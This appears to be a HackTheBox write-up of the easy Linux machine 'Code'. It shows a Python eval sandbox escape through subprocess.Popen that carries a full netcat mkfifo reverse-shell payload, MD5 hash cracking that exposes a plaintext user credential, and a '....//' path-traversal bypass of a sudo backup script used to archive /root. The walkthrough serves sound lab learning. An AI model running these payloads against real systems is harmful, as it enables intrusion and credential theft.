---
title: Code
tags:
  - HackTheBox
  - Easy
  - Linux
  - Python-Scripting
  - Python-Eval-Protections
  - Code_Review
---
![](Pasted%20image%2020250322195910.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.62 code.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- code.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  upnp
```

![](Pasted%20image%2020250322200235.png)

I created a new user:

![](Pasted%20image%2020250322200405.png)

## Weaponization

I'll try to get RCE by Breaking Python 3 eval protections. I found this awesome blog [netsec.expert](https://netsec.expert/posts/breaking-python3-eval-protections/).

Python has a lot of classes that exist for `object`, so we can know them by printing `[].__class__.__base__.__subclasses__()`:

![](Pasted%20image%2020250322224511.png)

Specifically, the class number 317 is [subprocess.Popen](https://docs.python.org/3/library/subprocess.html) which allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.

```shell
subprocess.run(_args_, _*_, _stdin=None_, _input=None_, _stdout=None_, _stderr=None_, _capture_output=False_, _shell=False_, _cwd=None_, _timeout=None_, _check=False_, _encoding=None_, _errors=None_, _text=None_, _env=None_, _universal_newlines=None_, _**other_popen_kwargs_)
```

We can use tha argument `_shell=True_` to spawn a reverse shell.
## Exploitation

I'll use the following payload to get a reverse shell:

```python
().__class__.__bases__[0].__subclasses__()[317](['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 666 >/tmp/f'], shell=True)
```

![](Pasted%20image%2020250322224910.png)

### User flag

![](Pasted%20image%2020250322232453.png)

## Pivoting

I found a `database.db` inside `/home/app-production/app/instance`, which had a md5 credential of a user called `martin`:

![](Pasted%20image%2020250322225408.png)

Also got another user called `development` password's hash.

Then I checked both hashes in crackstation:

![](Pasted%20image%2020250322225533.png)

> Credentials: `martin:nafeelswordsmaster`

## Privilege Escalation

I checked the sudo vulnerability:

```shell
sudo -l

[redacted]
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

I got the code of the script:

```sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Basically the script takes the content of the `task.json` and then creates a backup of the content you specify, so I put this inside `task.json`:

```sh
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//....//root"
  ]
}
```

- *NOTE: put `....//` because the script also removes `./`*

Then I executed the script:

```shell
sudo /usr/bin/backy.sh ~/backups/task.json
```

![](Pasted%20image%2020250322231704.png)

### Root flag

![](Pasted%20image%2020250322231813.png)

==Machine pwned!==